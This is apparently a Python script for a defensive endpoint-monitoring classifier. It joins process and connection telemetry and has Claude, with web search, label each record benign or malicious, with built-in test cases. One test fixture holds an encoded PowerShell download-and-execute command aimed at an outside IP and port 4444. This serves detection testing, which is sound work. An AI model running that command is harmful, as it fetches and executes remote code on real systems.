"""
IEPIS - Data Cleaner + Web-Search-Grounded LLM Classifier
-------------------------------------------------------------
Step 1: Parse raw JSONL events from fig2_monitor.py
Step 2: JOIN process records with their connection records by PID
Step 3: Clean + save the joined, tabular data to its own file (CSV)
Step 4: For each row, ask Claude to FIRST search the web for threat intel
        on the hash/IP/domain, THEN classify based on what it finds
Step 5: Test prompt quality with known ground-truth examples

Dependencies:
    pip install pandas anthropic python-dotenv

Usage:

# Full monitoring pipeline
python AI_model_classification.py --input events.jsonl

# Classify an already cleaned CSV
python AI_model_classification.py --clean-input clean.csv

# Run built-in prompt tests
python AI_model_classification.py --test-only
"""

import os
import json
import argparse
import time
import re
import pandas as pd
from anthropic import Anthropic
from dotenv import load_dotenv

load_dotenv()

API_KEY = os.getenv("ANTHROPIC_API_KEY")
client = Anthropic(api_key=API_KEY) if API_KEY else None


import logging

logging.basicConfig(
    filename="iepis_audit.log",
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

logger = logging.getLogger("IEPIS")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("anthropic").setLevel(logging.WARNING)


# ─────────────────────────────────────────────────────────
# STEP 1 + 2: Load raw events AND join process <-> connection by PID
# ─────────────────────────────────────────────────────────

def load_and_join(jsonl_path: str) -> pd.DataFrame:
    """
    Reads raw JSONL events and produces ONE ROW PER (PID, connection) pair,
    joining:
      - process details   (from new_process events)
      - connection details (from new_connection events, same PID)

    A process with no connections -> row with connection fields = unknown.
    A connection with no matching process record -> row with process
    fields = unknown, flagged as an "orphan" connection (PID seen on the
    network side but never observed on the process side in this capture).
    """
    process_by_pid = {}
    connections_by_pid = {}

    with open(jsonl_path, "r") as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                print(f"[WARN] Line {line_num}: invalid JSON, skipping")
                continue

            event_type = event.get("event")
            data = event.get("data", {})

            if event_type == "new_process":
                pid = data.get("Internal_Process_PID")
                if pid is not None:
                    process_by_pid[pid] = data

            elif event_type == "new_connection":
                pid = data.get("Network_Owning_PID")
                if pid is not None:
                    connections_by_pid.setdefault(pid, []).append(data)

            # process_ended / connection_ended -> skipped, not useful for classification

    all_pids = set(process_by_pid.keys()) | set(connections_by_pid.keys())
    rows = []

    for pid in all_pids:
        proc = process_by_pid.get(pid, {})
        conns = connections_by_pid.get(pid, [])

        if not conns:
            rows.append(_build_row(pid, proc, {}, is_orphan_connection=False))
        else:
            for conn in conns:
                is_orphan = not proc
                rows.append(_build_row(pid, proc, conn, is_orphan_connection=is_orphan))

    if not rows:
        print("[WARN] No usable events found in file.")
        return pd.DataFrame()

    df = pd.DataFrame(rows)
    df = _clean_dataframe(df)
    return df


def _build_row(pid, proc, conn, is_orphan_connection):
    """Combine one process record + one connection record into a flat row."""
    return {
        "pid"                           : pid,
        "process_name"                  : clean_str(proc.get("Internal_Process_Name")),
        "process_owner"                 : clean_str(proc.get("Internal_Process_Ownership")),
        "process_hash_sha256"           : clean_str(proc.get("Internal_Process_Hash")),
        "cert_status"                   : clean_str(proc.get("Internal_Process_Certificate_status")),
        "thread_count"                  : proc.get("Internal_Machine_Threads"),
        "parent_pid"                    : proc.get("Internal_Process_Parent_PID"),
        "command_line"                  : clean_str(proc.get("Internal_Process_CommandLine")),
        "has_connection"                : bool(conn),
        "network_protocol"              : clean_str(conn.get("Network_Protocol")),
        "network_connection_state"      : clean_str(conn.get("Network_Connection_State")),
        "network_out_process_ip"        : clean_str(conn.get("Network_Out_Process_IP")),
        "network_out_process_fqdn"      : clean_str(conn.get("Network_Out_Process_FQDN")),
        "network_out_process_port"      : conn.get("Network_Out_Process_Port"),
        "network_out_process_service"   : clean_str(conn.get("Network_Out_Process_Service")),
        "network_in_process_ip"         : clean_str(conn.get("Network_In_Process_IP")),
        "network_in_process_fqdn"       : clean_str(conn.get("Network_In_Process_FQDN")),
        "network_in_process_port"       : conn.get("Network_In_Process_Port"),
        "network_in_process_service"    : clean_str(conn.get("Network_In_Process_Service")),
        "is_orphan_connection"          : is_orphan_connection,
        "process_executable_path"       : clean_str(proc.get("Internal_Process_Executable_Path")),
    }


def clean_str(val):
    if val is None:
        return None
    val = str(val).strip()
    return val if val else None


def _clean_dataframe(df):
    """Fill missing values, dedupe, and tidy types for tabular storage."""
    text_cols = [
        "process_name", "process_owner", "cert_status", "command_line",
        "network_protocol", "network_connection_state",
        "network_out_process_ip", "network_out_process_fqdn",
        "network_in_process_ip", "network_in_process_fqdn",
        "network_out_process_service", "network_in_process_service"
    ]
    for c in text_cols:
        if c in df.columns:
            df[c] = df[c].fillna("unknown")

    num_cols = ["pid", "thread_count", "parent_pid",
                "network_out_process_port", "network_in_process_port"]
    for c in num_cols:
        if c in df.columns:
            df[c] = df[c].fillna(0).astype(int)

    df["process_hash_sha256"] = df["process_hash_sha256"].fillna("unknown")

    df = df.drop_duplicates(subset=["pid", "network_protocol", "network_out_process_ip",
                                     "network_out_process_port", "network_connection_state"])
    df = df.sort_values(by=["pid"]).reset_index(drop=True)
    return df


# ─────────────────────────────────────────────────────────
# STEP 4: Build prompt — REQUIRE web search before classification
# ─────────────────────────────────────────────────────────

SYSTEM_PROMPT = """You are a cybersecurity analyst for an endpoint intrusion detection system (IEPIS).

You will be given JOINED telemetry for one process and (if present) its associated network connection from a monitored Windows/Linux endpoint.

The telemetry contains process metadata, executable hash, digital signature, command line, process lineage, and correlated network information.

---

## MANDATORY ANALYSIS PROCEDURE

STEP 1 — Perform Threat Intelligence Verification

Before classifying the record, ALWAYS perform web searches whenever possible.

Check the following artifacts if available:

• SHA-256 executable hash
• Destination IP address
• Destination FQDN
• Process name
• Executable path
• Command line
• Certificate status

Consult reputable public threat intelligence sources whenever applicable, including but not limited to:

• VirusTotal
• MalwareBazaar
• AbuseIPDB
• AlienVault OTX
• MITRE ATT&CK
• CISA Advisories
• Vendor Documentation
• Official Microsoft / GitHub / Google / Oracle documentation

If an indicator cannot be searched, explicitly state:

"Not Available."

If a search produces no results, explicitly state:

"No malicious match found."

---

STEP 2 — Classify

Use ONLY these labels:

BENIGN

Normal operating-system activity or expected application behavior.
Threat intelligence confirms legitimacy OR no convincing malicious evidence exists.

MALICIOUS

Threat intelligence confirms maliciousness OR multiple independent behavioral indicators strongly suggest malicious activity.

Examples include:

• Reverse shells
• LOLBin abuse
• Encoded PowerShell
• Process masquerading
• Known malicious hashes
• Connections to known C2 infrastructure
• Hidden/orphan processes communicating externally

---

Classification Rules

1. Never invent information.

2. Unknown means unavailable — not malicious.

3. Evaluate ALL telemetry together.

4. Multiple weak indicators together may justify MALICIOUS.

5. If evidence is mixed but insufficient, classify BENIGN.

6. Always explain WHY.

7. If threat intelligence directly identifies an indicator as malicious, explicitly mention that finding.

---

Threat Intelligence Finding

Write this field EXACTLY using the following structure.

## Hash Lookup

...

## IP Lookup

...

## Domain Lookup

...

## Other Intelligence

...

## References Consulted

• ...
• ...
• ...

Rules

• Mention only searches actually performed.
• If unavailable write "Not Available."
• If no threat intelligence exists write "No malicious match found."
• If a match exists, state:
  - what was found
  - where it was found
• Avoid lengthy background explanations.
• Prefer concise intelligence summaries.
• Focus on findings rather than descriptions.
• One to three short sentences per section.
• Include the most important intelligence finding.
• Target approximately 60–90 words for most records.
• Up to 120 words only when a confirmed malicious match exists.

Example:

## Hash Lookup

No malicious match found.

## IP Lookup

176.10.99.200 identified as a Tor exit node.

## Domain Lookup

Not Available.

## Other Intelligence

Tor infrastructure is commonly associated with anonymized communications and malicious C2 activity.

## References Consulted

• AbuseIPDB
• AlienVault OTX

---

Reason

Write this field EXACTLY using the following structure.

## Indicators Observed

• ...

• ...

• ...

• ...

## Assessment

Write ONE concise paragraph explaining why those indicators support the final classification.

Rules

• Do not repeat the Threat Intelligence section.
• Mention strongest indicators first.
• Maximum 6 indicators.
• Each indicator should be short and factual.
• Focus only on evidence that influenced the final decision.
• Mention the strongest threat-intelligence finding if relevant.
• Keep the assessment concise.
• Target approximately 60–100 words.

Example:

## Indicators Observed

• Orphan connection
• No associated process
• Established TCP session
• Destination is Tor infrastructure

## Assessment

The connection is not associated with a visible process and terminates at a known Tor exit node. The combination of anonymized infrastructure and orphan network activity provides strong evidence of malicious behavior.

---

OUTPUT QUALITY REQUIREMENTS

• Write like a SOC analyst.
• Prefer concise factual findings over long explanations.
• Do not write essays.
• Do not explain what VirusTotal, MITRE, AbuseIPDB, or other sources are.
• Clearly identify any threat-intelligence matches.
• Prioritize evidence over background information.
• Make the output suitable for spreadsheets, dashboards, and incident reports.

---

Return ONLY valid JSON.

{
"classification": "BENIGN" | "MALICIOUS",
"confidence": "LOW" | "MEDIUM" | "HIGH",
"threat_intel_finding": "...",
"reason": "..."
}

Both threat_intel_finding and reason MUST remain plain strings.

Do NOT return nested JSON.
Do NOT return Markdown.
Do NOT return explanations outside the JSON.

CRITICAL FORMATTING RULES

* Both threat_intel_finding and reason MUST be plain strings only.
* No nested JSON objects or arrays inside these fields.
* No markdown code fences anywhere in the response.
* The outer response must be a single valid JSON object and nothing else.
* Use \n for newlines inside string fields if needed.
  """


def build_prompt(row):
    """Build a prompt from a joined row (process + optional connection)."""
    lines = [
        "Analyze the following JOINED process and network telemetry record.",
        "A SHA-256 hash is provided where available.",
        "",
        "Process Information",
        "-------------------",
        f"Process Name          : {row.get('process_name', 'unknown')}",
        f"PID                   : {row.get('pid', 'unknown')}",
        f"Owner                 : {row.get('process_owner', 'unknown')}",
        f"Parent PID            : {row.get('parent_pid', 'unknown')}",
        f"Process Hash (SHA-256): {row.get('process_hash_sha256', 'unknown')}",
        f"Certificate Status    : {row.get('cert_status', 'unknown')}",
        f"Thread Count          : {row.get('thread_count', 'unknown')}",
        f"Command Line          : {row.get('command_line', 'unknown')}",
        "",
        "Network Information",
        "-------------------",
        f"Has Network Connection: {row.get('has_connection', False)}",
        f"Is Orphan Connection  : {row.get('is_orphan_connection', False)} (PID seen on network but not in process records)",
        f"Protocol              : {row.get('network_protocol', 'unknown')}",
        f"Connection State      : {row.get('network_connection_state', 'unknown')}",
        "",
        "Outbound Connection",
        "-------------------",
        f"Outbound IP           : {row.get('network_out_process_ip', 'unknown')}",
        f"Outbound FQDN         : {row.get('network_out_process_fqdn', 'unknown')}",
        f"Outbound Port         : {row.get('network_out_process_port', 'unknown')}",
        f"Outbound Service      : {row.get('network_out_process_service', 'unknown')}",
        "",
        "Inbound Connection",
        "------------------",
        f"Inbound IP            : {row.get('network_in_process_ip', 'unknown')}",
        f"Inbound FQDN          : {row.get('network_in_process_fqdn', 'unknown')}",
        f"Inbound Port          : {row.get('network_in_process_port', 'unknown')}",
        f"Inbound Service       : {row.get('network_in_process_service', 'unknown')}",
    ]
    return "\n".join(lines)



def query_llm(prompt, row, max_retries=5):
        """
        Send one joined record to Claude with web_search enabled.
        Claude is required (via system prompt) to search before classifying.
        Implements exponential backoff for rate limit errors (429).
        """

        if not client:
            return {
                "classification": "ERROR",
                "confidence": "LOW",
                "threat_intel_finding": "",
                "reason": "ANTHROPIC_API_KEY not set."
            }

        for attempt in range(max_retries):

            start_time = time.time()

            try:
                response = client.messages.create(
                    model="claude-sonnet-4-6",
                    max_tokens=2500,
                    temperature=0,
                    system=SYSTEM_PROMPT,
                    tools=[{"type": "web_search_20250305", "name": "web_search"}],
                    messages=[{"role": "user", "content": prompt}]
                )

                # Get the final text block
                final_text = None

                for block in response.content:
                    if block.type == "text":
                        final_text = block.text

                if not final_text:

                    logger.error(
                        f"""
    ============================================================
    PID: {row.get('pid')}
    Process: {row.get('process_name')}

    Status: ERROR

    Error:
    No text response from model.
    ============================================================
    """
                    )

                    return {
                        "classification": "ERROR",
                        "confidence": "LOW",
                        "threat_intel_finding": "",
                        "reason": "No text response from model."
                    }

                text = final_text.strip()

                # Strip markdown fences if present
                text = re.sub(r"```json\s*", "", text)
                text = re.sub(r"```\s*", "", text)
                text = text.strip()

                # Extract JSON object
                m = re.search(r"\{.*\}", text, re.DOTALL)

                if not m:
                    print(f"    [WARN] No JSON found in response. Raw tail: {text[-200:]!r}")
                    raise json.JSONDecodeError("No JSON object found", text, 0)

                result = json.loads(m.group())

                processing_time = round(time.time() - start_time, 2)

                identifier = (
                    row.get("process_name")
                    or row.get("network_out_process_fqdn")
                    or row.get("network_out_process_ip")
                    or "UNKNOWN"
                )

                logger.info(
                    f"""
    ============================================================
    Identifier: {identifier}

    Telemetry Summary
    -----------------
    PID: {row.get('pid')}
    Process: {row.get('process_name')}
    Owner: {row.get('process_owner')}
    Hash: {row.get('process_hash_sha256')}
    Certificate: {row.get('cert_status')}

    Has Connection: {row.get('has_connection')}
    Orphan Connection: {row.get('is_orphan_connection')}
    
    Executable Path : 
    {row.get('process_executable_path')}

    Destination IP:
    {row.get('network_out_process_ip')}

    Destination FQDN:
    {row.get('network_out_process_fqdn')}

    Destination Port:
    {row.get('network_out_process_port')}

    Protocol:
    {row.get('network_protocol')}

    Connection State:
    {row.get('network_connection_state')}

    AI Classification
    -----------------
    Classification: {result.get('classification')}
    Confidence: {result.get('confidence')}

    Threat Intel
    ------------
    {result.get('threat_intel_finding', '')}

    Reason
    ------
    {result.get('reason', '')}

    Processing Time: {processing_time}s

    Status: SUCCESS
    ============================================================
    """
                )

                return result

            except Exception as e:

                err_str = str(e)

                identifier = (
                    row.get("process_name")
                    or row.get("network_out_process_fqdn")
                    or row.get("network_out_process_ip")
                    or "UNKNOWN"
                )

                # Rate limit handling
                if "429" in err_str or "rate_limit" in err_str:

                    logger.warning(
                        f"""
    ============================================================
    Identifier: {identifier}

    PID: {row.get('pid')}
    Process: {row.get('process_name')}

    Status: RATE_LIMIT

    Attempt:
    {attempt + 1}/{max_retries}

    Error:
    {err_str}
    ============================================================
    """
                    )

                    wait = (2 ** attempt) * 15

                    print(
                        f"    [RATE LIMIT] attempt {attempt+1}/{max_retries} — waiting {wait}s..."
                    )

                    time.sleep(wait)
                    continue

                # JSON parse failure
                if isinstance(e, json.JSONDecodeError):

                    print(f"    [WARN] JSON parse failed: {e}")

                    logger.warning(
                        f"""
    ============================================================
    Identifier: {identifier}

    PID: {row.get('pid')}
    Process: {row.get('process_name')}

    Status: JSON_PARSE_FAILURE

    Error:
    {e}
    ============================================================
    """
                    )

                    return {
                        "classification": "UNKNOWN",
                        "confidence": "LOW",
                        "threat_intel_finding": "",
                        "reason": "LLM response was not valid JSON"
                    }

                # Generic error
                logger.error(
                    f"""
    ============================================================
    Identifier: {identifier}

    PID: {row.get('pid')}
    Process: {row.get('process_name')}

    Status: ERROR

    Error:
    {err_str}
    ============================================================
    """
                )

                return {
                    "classification": "ERROR",
                    "confidence": "LOW",
                    "threat_intel_finding": "",
                    "reason": err_str
                }

        logger.error(
            f"""
    ============================================================
    PID: {row.get('pid')}
    Process: {row.get('process_name')}

    Status: ERROR

    Error:
    Exceeded {max_retries} retries due to rate limiting.
    ============================================================
    """
        )

        return {
            "classification": "ERROR",
            "confidence": "LOW",
            "threat_intel_finding": "",
            "reason": f"Exceeded {max_retries} retries due to rate limiting."
        }




# ─────────────────────────────────────────────────────────
# STEP 5: Classify all rows
# ─────────────────────────────────────────────────────────

def classify_dataframe(df):
    classifications, confidences, ti_findings, reasons = [], [], [], []

    total = len(df)
    for idx, row in df.iterrows():
        print(f"  [{idx+1}/{total}] PID {row['pid']} | {row['process_name']} -> searching + classifying...")
        prompt = build_prompt(row)
        result = query_llm(prompt,row)

        classifications.append(result.get("classification", "UNKNOWN"))
        confidences.append(result.get("confidence", "LOW"))
        ti_findings.append(result.get("threat_intel_finding", ""))
        reasons.append(result.get("reason", ""))

        # 6s between requests keeps safely under 30k token/min rate limit
        time.sleep(6)

    df = df.copy()
    df["AI__Model_classification"] = classifications
    df["AI__Model_confidence"]     = confidences
    df["AI__Threat_Intel_Finding"] = ti_findings
    df["AI__Model_Reason"]         = reasons
    return df


# ─────────────────────────────────────────────────────────
# STEP 6: Prompt quality tests (ground-truth examples)
# ─────────────────────────────────────────────────────────

TEST_CASES = [
    {
        "label": "Normal VS Code -> GitHub connection",
        "expected": "BENIGN",
        "row": pd.Series({
            "pid": 9940, "process_name": "Code.exe", "process_owner": "unknown",
            "parent_pid": 0, "process_hash_sha256": "unknown", "cert_status": "unknown",
            "thread_count": 0, "command_line": "unknown",
            "has_connection": True, "is_orphan_connection": False,
            "network_protocol": "TCP", "network_connection_state": "ESTABLISHED",
            "network_out_process_ip": "140.82.114.5",
            "network_out_process_fqdn": "lb-140-82-114-5-iad.github.com",
            "network_out_process_port": 443, "network_out_process_service": "https",
            "network_in_process_ip": "192.168.1.25", "network_in_process_fqdn": "unknown",
            "network_in_process_port": 54587, "network_in_process_service": "unknown"
        })
    },
    {
        "label": "PowerShell reverse shell to Metasploit port",
        "expected": "MALICIOUS",
        "row": pd.Series({
            "pid": 1234, "process_name": "powershell.exe", "process_owner": "unknown",
            "parent_pid": 0, "process_hash_sha256": "unknown", "cert_status": "unknown",
            "thread_count": 0,
            "command_line": "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANQAvAHMAaABlAGwAbAAnACkAfABJAEUAWAA=",
            "has_connection": True, "is_orphan_connection": False,
            "network_protocol": "TCP", "network_connection_state": "ESTABLISHED",
            "network_out_process_ip": "185.220.101.45",
            "network_out_process_fqdn": "unknown",
            "network_out_process_port": 4444, "network_out_process_service": "unknown",
            "network_in_process_ip": "192.168.1.25", "network_in_process_fqdn": "unknown",
            "network_in_process_port": 49200, "network_in_process_service": "unknown"
        })
    },
    {
        "label": "Normal svchost.exe no connections",
        "expected": "BENIGN",
        "row": pd.Series({
            "pid": 888, "process_name": "svchost.exe", "process_owner": "SYSTEM",
            "parent_pid": 640,
            "process_hash_sha256": "abc123def456abc123def456abc123def456abc123def456abc123def456abc1",
            "cert_status": "signed", "thread_count": 12,
            "command_line": "C:\\Windows\\System32\\svchost.exe -k NetworkService",
            "has_connection": False, "is_orphan_connection": False,
            "network_protocol": "unknown", "network_connection_state": "unknown",
            "network_out_process_ip": "unknown", "network_out_process_fqdn": "unknown",
            "network_out_process_port": 0, "network_out_process_service": "unknown",
            "network_in_process_ip": "unknown", "network_in_process_fqdn": "unknown",
            "network_in_process_port": 0, "network_in_process_service": "unknown"
        })
    },
    {
        "label": "MySQL server listening on standard port",
        "expected": "BENIGN",
        "row": pd.Series({
            "pid": 6272, "process_name": "mysqld.exe", "process_owner": "unknown",
            "parent_pid": 0, "process_hash_sha256": "unknown", "cert_status": "unknown",
            "thread_count": 0, "command_line": "unknown",
            "has_connection": True, "is_orphan_connection": False,
            "network_protocol": "TCP", "network_connection_state": "LISTEN",
            "network_out_process_ip": "unknown", "network_out_process_fqdn": "unknown",
            "network_out_process_port": 0, "network_out_process_service": "unknown",
            "network_in_process_ip": "0.0.0.0", "network_in_process_fqdn": "unknown",
            "network_in_process_port": 3306, "network_in_process_service": "mysql"
        })
    },
    {
        "label": "Orphan connection to Tor exit node",
        "expected": "MALICIOUS",
        "row": pd.Series({
            "pid": 9999, "process_name": "unknown", "process_owner": "unknown",
            "parent_pid": 0, "process_hash_sha256": "unknown", "cert_status": "unknown",
            "thread_count": 0, "command_line": "unknown",
            "has_connection": True, "is_orphan_connection": True,
            "network_protocol": "TCP", "network_connection_state": "ESTABLISHED",
            "network_out_process_ip": "176.10.99.200",
            "network_out_process_fqdn": "tor-exit-node.anonymizer.net",
            "network_out_process_port": 9001, "network_out_process_service": "unknown",
            "network_in_process_ip": "192.168.1.25", "network_in_process_fqdn": "unknown",
            "network_in_process_port": 55000, "network_in_process_service": "unknown"
        })
    },
]


def run_prompt_tests():
    print("\n" + "="*60)
    print("PROMPT QUALITY TESTS (web-search-grounded)")
    print("="*60)

    passed = 0
    results = []

    for i, tc in enumerate(TEST_CASES, 1):
        prompt = build_prompt(tc["row"])
        result = query_llm(prompt, tc["row"])
        got = result.get("classification", "UNKNOWN")
        expected = tc["expected"]
        ok = got == expected
        if ok:
            passed += 1

        print(f"\n[{i}] {tc['label']}")
        print(f"    Expected  : {expected}")
        print(f"    Got       : {got} ({result.get('confidence','?')} confidence)")
        print(f"    Finding   : {result.get('threat_intel_finding','')[:120]}...")
        print(f"    Reason    : {result.get('reason','')[:120]}...")
        print(f"    Status    : {'PASS' if ok else 'FAIL'}")

        results.append({"test_case": tc["label"], "expected": expected, "got": got, "pass": ok})
        time.sleep(6)

    accuracy = passed / len(TEST_CASES) * 100
    print(f"\n{'='*60}")
    print(f"Results: {passed}/{len(TEST_CASES)} passed | Accuracy: {accuracy:.1f}%")
    print(f"{'='*60}\n")
    return {"accuracy": accuracy, "passed": passed, "details": results}


# ─────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="IEPIS LLM Classifier (joined + web-search-grounded)")
    parser.add_argument("--input", type=str, help="Input JSONL file from fig2_monitor.py")
    parser.add_argument("--clean-input", type=str,
                        help="Use an already cleaned CSV instead of a JSONL file.")
    parser.add_argument("--clean-output", type=str, default="clean_data.csv",
                        help="Where to save the cleaned, joined tabular data")
    parser.add_argument("--output", type=str, default="results.csv",
                        help="Output CSV with classifications")
    parser.add_argument("--test-only", action="store_true")
    parser.add_argument("--test", action="store_true")
    args = parser.parse_args()

    if args.test_only:
        run_prompt_tests()
        return

    # Option 1: Already-cleaned CSV
    if args.clean_input:
        print(f"\n[Step 3] Loading cleaned CSV: {args.clean_input}")
        df = pd.read_csv(args.clean_input)

    # Option 2: Raw JSONL
    elif args.input:
        print(f"\n[Step 1-2] Loading and joining: {args.input}")
        df = load_and_join(args.input)
        if df.empty:
            return
        print(f"[Step 1-2] {len(df)} joined rows "
              f"({df['has_connection'].sum()} with connections, "
              f"{df['is_orphan_connection'].sum()} orphan connections)")
        df.to_csv(args.clean_output, index=False)
        print(f"[Step 3] Clean joined data saved to: {args.clean_output}")

    else:
        print("[ERROR] Provide either:\n"
              "  --input <events.jsonl>\n"
              "or\n"
              "  --clean-input <clean.csv>")
        return

    print("\n[Step 3] Preview:")
    preview_cols = ["pid", "process_name", "cert_status", "has_connection",
                    "network_protocol", "network_out_process_ip",
                    "network_out_process_fqdn", "network_out_process_port",
                    "is_orphan_connection"]
    available = [c for c in preview_cols if c in df.columns]
    print(df[available].to_string(index=True))

    print(f"\n[Step 4-5] Classifying {len(df)} records via Claude (with web search)...")
    print(f"           Estimated time: ~{len(df) * 6 // 60}m {len(df) * 6 % 60}s minimum (rate limit pacing)")
    df = classify_dataframe(df)

    df.to_csv(args.output, index=False)
    print(f"\n[Step 5] Final classified results saved to: {args.output}")

    print("\n[Summary] Classification breakdown:")
    print(df["AI__Model_classification"].value_counts().to_string())

    print("\n[Summary] Malicious records:")
    flagged = df[df["AI__Model_classification"] == "MALICIOUS"][
        ["pid", "process_name", "network_out_process_fqdn",
         "AI__Model_classification", "AI__Model_confidence", "AI__Model_Reason"]
    ]
    print("  None found." if flagged.empty else flagged.to_string(index=False))

    if args.test:
        run_prompt_tests()


if __name__ == "__main__":
    main()